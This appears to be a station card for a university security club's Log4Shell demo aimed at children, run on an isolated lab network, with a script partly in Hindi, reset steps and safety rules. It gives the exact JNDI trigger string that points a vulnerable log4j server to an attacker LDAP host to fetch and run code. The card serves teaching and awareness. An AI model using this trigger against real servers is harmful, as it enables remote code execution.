# Station Card — print one per station

## Before the batch (30 sec)

- [ ] Victim screen: **normal wallpaper**, unlocked, brightness max.
- [ ] Victim terminal: Minecraft server running, **minimised**.
- [ ] Attacker terminal: `./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20` ready.
- [ ] Trigger copied / visible; attacker logs clear.
- [ ] No internet, host-only network only.

## The batch (5 min)

1. **Intro (25 s):** “EHAX, DTU cybersecurity. Ek text message se poora control —
   bina password.”
2. **Setup (25 s):** “Ye Minecraft server hai. Chat log hota hai. Andar purani
   log4j library thi jisme galti thi.”
3. **Hand-off (15 s):** “Tum [name] ye message bhejo.” → kid presses **Enter**
   (or types the pre-copied trigger).
4. **Pause 3–5 seconds.** Silence. Let it land.
5. **Reveal:** “Dekho screen pe!” → wallpaper changes.
6. **Explain (35 s):** “Message → log → library ne remote code download kiya →
   chala diya. Is baar sirf wallpaper. Real attacker files padh sakta tha.”
7. **Why (20 s):** “Updates karo. Bug 2021 ka hai, patched hai. Bina permission
   kisi ke system pe try karna illegal hai.”
8. **Close:** “Sawaal? Nahi toh next group!”

## After the batch

- [ ] Restore victim snapshot **or** `cd victim && ./reset-wallpaper.sh`.
- [ ] Delete `/tmp/ehax-payload-last-run` if not using the reset script.
- [ ] Confirm normal wallpaper before next group.
- [ ] Attacker servers stay running; trigger prompt ready.

## If it fails

- Don't debug silently. Say: “Ek second, dobara bhejte hain.”
- Check: victim desktop visible? server still running? proof file?
- `cat /tmp/ehax-payload-proof.txt` → if line exists, payload ran; wallpaper
  session issue. Show backup video and continue.
- `tail attacker/logs/ldap.log` → if no referral, chat didn't reach the server.

## Never

- Never run on a real laptop or public IP.
- Never show a shell/file access “for fun.”
- Never skip: “Bina permission illegal hai.”
- Never read the full trigger syntax to the audience.

## Exact trigger (operator only)

```text
${jndi:ldap://10.10.10.10:1389/a}
```

If the attacker IP changes, regenerate with the run script; don't hand-edit
half the string.
